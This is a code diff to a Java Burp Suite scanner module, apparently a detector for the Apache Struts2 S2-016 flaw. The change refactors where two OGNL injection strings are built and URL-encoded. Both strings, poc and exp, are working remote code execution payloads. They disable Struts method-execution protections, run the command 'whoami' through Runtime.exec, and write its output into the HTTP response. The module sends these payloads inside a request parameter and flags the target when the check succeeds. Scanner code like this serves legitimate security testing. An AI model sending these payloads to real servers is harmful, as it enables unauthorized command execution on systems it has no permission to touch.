@@ -5,9 +5,10 @@ import burp.*;
 import java.net.URLEncoder;
 
 public class S2_016 extends IModule {
-    // TODO
-    //redirectAction:和action: 也可触发漏洞
-    public String poc =
+    public S2_016() {
+        // TODO
+        //redirectAction:和action: 也可触发漏洞
+        poc =
             "redirect:${" +
             "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
             "#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\")," +
@@ -19,22 +20,26 @@ public class S2_016 extends IModule {
             "#genxor.flush()," +
             "#genxor.close()" +
             "}";
-    public String exp =
-        "redirect:${" +
-        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
-        "#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\")," +
-        "#f.setAccessible(true)," +
-        "#f.set(#_memberAccess,true)," +
-        "#a=@java.lang.Runtime@getRuntime().exec(\"whoami\").getInputStream()," +
-        "#b=new java.io.InputStreamReader(#a)," +
-        "#c=new java.io.BufferedReader(#b)," +
-        "#d=new char[5000]," +
-        "#c.read(#d)," +
-        "#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()," +
-        "#genxor.print(#d)," +
-        "#genxor.flush()," +
-        "#genxor.close()" +
-        "}";
+        poc = URLEncoder.encode(poc);
+
+        exp =
+            "redirect:${" +
+            "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
+            "#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\")," +
+            "#f.setAccessible(true)," +
+            "#f.set(#_memberAccess,true)," +
+            "#a=@java.lang.Runtime@getRuntime().exec(\"whoami\").getInputStream()," +
+            "#b=new java.io.InputStreamReader(#a)," +
+            "#c=new java.io.BufferedReader(#b)," +
+            "#d=new char[5000]," +
+            "#c.read(#d)," +
+            "#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()," +
+            "#genxor.print(#d)," +
+            "#genxor.flush()," +
+            "#genxor.close()" +
+            "}";
+        exp = URLEncoder.encode(exp);
+    }
 
     @Override
     public IScanIssue start() {
@@ -42,10 +47,10 @@ public class S2_016 extends IModule {
         if (requestInfo.getMethod().equals("POST")) {
             in = (byte) 1;
         }
-        IParameter newParameter = helpers.buildParameter(URLEncoder.encode(poc), "1", in);
+        IParameter newParameter = helpers.buildParameter(poc, "1", in);
         request = helpers.updateParameter(request, newParameter);
         if (check()) {
-            this.detail = URLEncoder.encode(exp);
+            this.detail = exp;
             return creatCustomScanIssue();
         }
         return null;
